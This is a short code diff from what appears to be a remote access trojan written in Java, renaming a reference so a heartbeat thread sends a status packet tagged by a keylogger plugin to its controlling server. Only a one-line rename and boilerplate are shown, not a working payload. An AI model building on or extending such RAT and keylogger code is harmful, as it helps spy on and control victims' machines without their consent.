@@ -30,7 +30,7 @@ public class HeartbeatThread implements Runnable {
 					break;
 				}
 
-				server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
+				server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.STATUS_HEADER, server) {
 					@Override
 					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
 						
